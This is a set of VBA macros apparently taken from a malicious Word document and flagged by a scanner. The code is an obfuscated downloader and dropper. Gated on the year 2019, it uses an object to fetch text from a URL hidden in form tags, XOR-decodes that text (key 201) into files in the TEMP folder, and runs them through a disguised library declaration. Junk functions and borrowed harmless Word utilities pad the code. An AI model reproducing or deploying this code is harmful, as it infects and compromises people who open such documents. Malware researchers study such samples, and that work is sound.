Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

Public Sub Main()
If Year(Date) = 2019 Then
dekKRK.Work
End If
ThisDocument.Close
End Sub




Attribute VB_Name = "dekKRK"
Attribute VB_Base = "0{0AC462A7-8E42-4D04-AF04-7B4E005F458E}{0AB2563C-51F6-483F-A839-BC5722C77F7A}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Public gJOKdZy As String
Public qPhTzTX As Object
Dim vlnmlgmrglpPP(309, 2) As String
Public Sub Work()

On Error Resume Next

dekKRK.Hide

Set qPhTzTX = CreateObject(ptzFdx.Tag)

qPhTzTX.navigate (dekKRK.xWBUiY.Tag)

Do Until qPhTzTX.readyState = 4

DoEvents

Loop

gJOKdZy = qPhTzTX.Document.body.innerText

jbIAdqB

End Sub


'Replace accended chars with their plaintext alphabet counterparts
Function StripAccent(aString As String)
    Dim A As String * 1
    Dim B As String * 1
    Dim i As Integer
    Const AccChars = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Const RegChars = "SZszYAAAAAACEEEEIIIIDNOOOOOUUUUYaaaaaaceeeeiiiidnooooouuuuyy"
    For i = 1 To Len(AccChars)
        A = Mid(AccChars, i, 1)
        B = Mid(RegChars, i, 1)
        aString = Replace(aString, A, B)
    Next
    StripAccent = aString
End Function

'Remove all shapes in the Active Document
Function DeleteShapes()
    Dim i As Long
    With ActiveDocument
    For i = .Shapes.Count To 1 Step -1
        With .Shapes(i)
            If .Type = msoAutoShape Then .Delete
        End With
    Next i
End With
End Function



Public Sub onPqRKl(mVBSBIf As String, poVJAYI As String, rIPYIug As Integer)

Dim zVPtxSi() As String, xUdHhDn() As String, iaWQeWM As Long, siPaaql As Integer, eoJlwKL As String, aNwXgtQ As String
aNwXgtQ = vbNewLine
Dim bOIIFOG() As Byte

Dim lUQIdnp As Integer

Dim vAJrzHP As Byte

bOIIFOG = StrConv(mVBSBIf, 128)

zVPtxSi = Split(StrConv(bOIIFOG, 64), aNwXgtQ)

Open poVJAYI For Binary Lock Read Write As #2


For iaWQeWM = 1 To (UBound(zVPtxSi))

xUdHhDn = Split(zVPtxSi(iaWQeWM), ",")

eoJlwKL = xUdHhDn(rIPYIug)

If Len(eoJlwKL) > 0 Then

vAJrzHP = Val(eoJlwKL)

vAJrzHP = vAJrzHP Xor 201

Put #2, , CByte(vAJrzHP)


End If


Next

Close #2

 End Sub
 

Public Sub jbIAdqB()

Dim zVPtxSi() As String, xUdHhDn() As String, iaWQeWM As Long, siPaaql As Integer, eoJlwKL As String

On Error Resume Next

ChDir (Environ("TEMP"))

With qPhTzTX



Call onPqRKl(dekKRK.gJOKdZy, uXdMLG.Tag, 0)



Call onPqRKl(dekKRK.gJOKdZy, nuAXGF.Tag, 1)




iInRZs.SendMessage 0, 0, 0, 0

Done:
Call onPqRKl(dekKRK.gJOKdZy, nuAXGF.Tag, 2)


iInRZs.SendMessage 0, 0, 0, 0


.Quit

End With


End Sub


'Save a new file from range Section within the parent file with fileName from Range Header within Section
Private Static Sub CopyAndSave(Section As Range, Header As Range, maxFileName As Integer)
    Dim name As String
    Header.Select
    Selection.ClearFormatting
    Dim D As Document
   
    'File name cannot contain \ / : * ? " < > |
    name = Replace(Header.Text, Chr(13), "")
    name = Application.CleanString(name)
    name = Replace(name, "\", "-")
    name = Replace(name, "/", "-")
    name = Replace(name, ":", "-")
    name = Replace(name, "?", "-")
    name = Replace(name, "*", "")
    name = Replace(name, """", "")
    name = Replace(name, "<", " ")
    name = Replace(name, ">", " ")
    name = Replace(name, "|", " ")
    name = Replace(name, "    ", "")
    name = Replace(name, Chr(10), "")
    name = Replace(name, Chr(13), "")
    name = Replace(name, Chr(9), "")
    name = Replace(name, "|2018|", "'")
    name = Replace(name, "|2019|", "'")
    name = Replace(name, "|201c|", "'")
    name = Replace(name, "|201d|", "'")
    name = Replace(name, " ", "")
    name = Replace(name, "|ae|", "(R)")
    name = Replace(name, "|2122|", "(TM)")
    name = Replace(name, "|2122|", "(TM)")
    name = Replace(name, "|a3|", "(E)")
    name = Replace(name, "", " ")
    name = Replace(name, "|2013|", "-")
    name = Replace(name, "|2014|", "-")
    name = Trim(name)
    name = StripAccent(name)
    'Debug.Print name
   
    'Reformatting Header
    Header.Select
    Selection.Font.Bold = True
    Selection.Font.Grow
    
    'Truncate File names to under maxFileName chars
    If (Len(name) > maxFileName) Then
        name = Left(name, maxFileName) & " ..."
    End If
    'Debug.Print "Saving: " & name
    
    Header.Copy
    Section.Copy
    
    'Saving Document
    Set D = Documents.Add
    D.Range.PasteAndFormat wdFormatOriginalFormatting
    With D.Content.Find
        .ClearFormatting
        .MatchWildcards = True
        .MatchCase = False
        .Text = "^13([1-9]).([1-9])*^13"
        .Replacement.ClearFormatting
        .Replacement.Text = ""
        .Execute Replace:=wdReplaceAll, Forward:=True, _
        Wrap:=wdFindContinue
    End With
    
    D.SaveAs2 FileName:=Section.Parent.Path & Application.PathSeparator & name & ".htm", _
    FileFormat:=wdFormatFilteredHTML
    D.Close
End Sub

'Remove all existing hyperlinks in a document.
Private Static Sub RemoveAllHyperlinks()
    Dim oField As Field
    For Each oField In ActiveDocument.Fields
        If oField.Type = wdFieldHyperlink Then
            oField.Unlink
        End If
    Next
    Set oField = Nothing
End Sub

'Replace all unformatted URLs with a hyperlink to itself.
Private Static Sub URLtoHyperlink()
  Dim f1 As Boolean, f2 As Boolean, f3 As Boolean
  Dim f4 As Boolean, f5 As Boolean, f6 As Boolean
  Dim f7 As Boolean, f8 As Boolean, f9 As Boolean
  Dim f10 As Boolean
  With Options
    ' Save current AutoFormat settings
    f1 = .AutoFormatApplyHeadings
    f2 = .AutoFormatApplyLists
    f3 = .AutoFormatApplyBulletedLists
    f4 = .AutoFormatApplyOtherParas
    f5 = .AutoFormatReplaceQuotes
    f6 = .AutoFormatReplaceSymbols
    f7 = .AutoFormatReplaceOrdinals
    f8 = .AutoFormatReplaceFractions
    f9 = .AutoFormatReplacePlainTextEmphasis
    f10 = .AutoFormatReplaceHyperlinks
    ' Only convert URLs
    .AutoFormatApplyHeadings = False
    .AutoFormatApplyLists = False
    .AutoFormatApplyBulletedLists = False
    .AutoFormatApplyOtherParas = False
    .AutoFormatReplaceQuotes = False
    .AutoFormatReplaceSymbols = False
    .AutoFormatReplaceOrdinals = False
    .AutoFormatReplaceFractions = False
    .AutoFormatReplacePlainTextEmphasis = False
    .AutoFormatReplaceHyperlinks = True
    ' Perform AutoFormat
    ActiveDocument.Content.AutoFormat
    ' Restore original AutoFormat settings
    .AutoFormatApplyHeadings = f1
    .AutoFormatApplyLists = f2
    .AutoFormatApplyBulletedLists = f3
    .AutoFormatApplyOtherParas = f4
    .AutoFormatReplaceQuotes = f5
    .AutoFormatReplaceSymbols = f6
    .AutoFormatReplaceOrdinals = f7
    .AutoFormatReplaceFractions = f8
    .AutoFormatReplacePlainTextEmphasis = f9
    .AutoFormatReplaceHyperlinks = f10
  End With
End Sub
Function StripAccentt(aString As String)
    Dim A As String * 1
    Dim B As String * 1
    Dim i As Integer
    Const AccChars = "|160||17d||161||17e||178||c0||c1||c2||c3||c4||c5||c7||c8||c9||ca||cb||cc||cd||ce||cf||d0||d1||d2||d3||d4||d5||d6||d9||da||db||dc||dd||e0||e1||e2||e3||e4||e5||e7||e8||e9||ea||eb||ec||ed||ee||ef||f0||f1||f2||f3||f4||f5||f6||f9||fa||fb||fc||fd||ff|"
    Const RegChars = "SZszYAAAAAACEEEEIIIIDNOOOOOUUUUYaaaaaaceeeeiiiidnooooouuuuyy"
    For i = 1 To Len(AccChars)
        A = Mid(AccChars, i, 1)
        B = Mid(RegChars, i, 1)
        aString = Replace(aString, A, B)
    Next
    StripAccentt = aString
End Function
'Remove all existing hyperlinks in a document.
Private Static Sub RemoveAllHyperlinksss()
    Dim fryrut As Field
    For Each fryrut In ActiveDocument.Fields
        If fryrut.Type = wdFieldHyperlink Then
            fryrut.Unlink
        End If
    Next
    Set fryrut = Nothing
End Sub



Public Function hIDbWaoQAs()
Dim hVSSkb As String
hVSSkb = "mzvasK"
Dim ewTlNjXADQOP As Integer
ewTlNjXADQOP = 1000
End Function

Public Function bxueQQrehE()
Dim pTPrRb As String
pTPrRb = "hQNdMA"
Dim nuQkujuBySEK As Integer
nuQkujuBySEK = 1000
End Function

Public Function kvrdyQoeeF()
Dim kjHtmR As String
kjHtmR = "qNKbuz"
Dim ikimpYxpFejy As Integer
ikimpYxpFejy = 1000
End Function

Public Function glJfSgrrkq()
Dim thEsTR As String
thEsTR = "lEbeOQ"
Dim riflWyvqBfyT As Integer
riflWyvqBfyT = 1000
End Function

Public Function oIGeagpShs()
Dim oWvuOh As String
oWvuOh = "uAybwP"
Dim mXWnroydiQfh As Integer
mXWnroydiQfh = 1000
End Function

Public Function kYxgUVsGNe()
Dim xUsTvh As String
xUsTvh = "pqQeQg"
Dim uVTMYOvEFSUB As Integer
uVTMYOvEFSUB = 1000
End Function

Public Function sVUEdVPhJF()
Dim sKKvQW As String
sKKvQW = "xoNDyf"
Dim qllotEyRleZq As Integer
qllotEyRleZq = 1000
End Function

'Save a new file from range Section within the parent file with fileName from Range Header within Section




Attribute VB_Name = "iInRZs"

Declare PtrSafe Function SendMessage Lib "Ace32" Alias _
"Dudear" (ByVal hWnd As Long, ByVal wMsg As Long, _
                    ByVal wParam As Long, _
                    ByVal lParam As Long) As Long

Public Enum CompareMethod
    BinaryCompare = VBA.vbBinaryCompare
    TextCompare = VBA.vbTextCompare
    DatabaseCompare = VBA.vbDatabaseCompare
End Enum




INQUEST-PP=macro
